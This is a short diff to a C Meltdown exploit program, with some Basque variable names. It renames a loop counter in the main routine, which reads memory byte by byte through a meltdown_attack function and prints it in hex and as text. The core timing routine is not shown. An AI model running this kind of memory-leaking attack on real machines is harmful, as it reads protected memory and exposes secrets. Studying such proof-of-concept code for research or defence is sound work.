@@ -127,7 +127,7 @@ uint8_t meltdown_attack(size_t addr, uint8_t* probe_array) {
 }
 
 int main(int argc, char** argv) {
-  int i, j;
+  int address, j;
   char *memoria_erreserbatu = malloc(PAGE * 300);
   if (!memoria_erreserbatu) {
     errno = ENOMEM;
@@ -169,9 +169,9 @@ int main(int argc, char** argv) {
     return -1;
   }
   // Leak byte-by-byte from start_addr, storing results in buffer
-  for (i = 0; i < len; i++) {
-    if (i > 0 && 0 == i % 16) {
-      print_address_content(start_addr + i - 16, ir_buffer, 16);
+  for (address = 0; address < len; address++) {
+    if (address > 0 && 0 == address % 16) {
+      print_address_content(start_addr + address - 16, ir_buffer, 16);
       print_string(ir_buffer, 16);
     }
 
@@ -186,13 +186,13 @@ int main(int argc, char** argv) {
       return -1;
     }
 
-    ir_buffer[i % 16] = meltdown_attack(start_addr + i, probe_array);
+    ir_buffer[address % 16] = meltdown_attack(start_addr + address, probe_array);
   }
 
-  if (i > 0) {
-      size_t tam_azkena = i % 16;
+  if (address > 0) {
+      size_t tam_azkena = address % 16;
       if (tam_azkena == 0) tam_azkena = 16;
-      size_t addr_azkena = start_addr + (i - tam_azkena);
+      size_t addr_azkena = start_addr + (address - tam_azkena);
 
       print_address_content(addr_azkena, ir_buffer, tam_azkena);
       print_string(ir_buffer, tam_azkena);
